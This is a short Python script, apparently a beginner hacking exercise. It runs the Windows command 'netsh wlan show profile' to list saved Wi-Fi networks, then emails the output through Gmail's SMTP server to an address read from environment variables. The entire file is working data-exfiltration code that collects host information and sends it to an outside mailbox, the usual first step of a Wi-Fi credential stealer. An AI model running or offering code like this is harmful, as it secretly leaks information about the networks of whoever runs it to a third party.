#!/usr/bin/env python3

import subprocess
import smtplib
from dotenv import load_dotenv
import os

def send_main(email, password, message):
    """
    Executes system command, saves output to variable and emails output to email of choice.
    Server used for sending email: Google's server, as Google allows people to use their server to send emails.
    Note: Google's email server runs on port 587.

    :param email: str
    :param password: str
    :param message: str
    :return:
    """

    server = smtplib.SMTP("smtp.gmail.com", 587)  #create instance of SMTP server
    server.starttls()  #initiate TLS connection
    server.login(email, password)
    server.sendmail(email, email, message)  #send email to self
    server.quit()

if __name__ == "__main__":
    load_dotenv()
    email = os.environ.get('RECEIVER')
    password = os.environ.get('PASSWORD')
    command = "netsh wlan show profile"
    result = subprocess.check_output(command, shell=True)  #executes system command and saves return variable
    send_main(email, password, result)

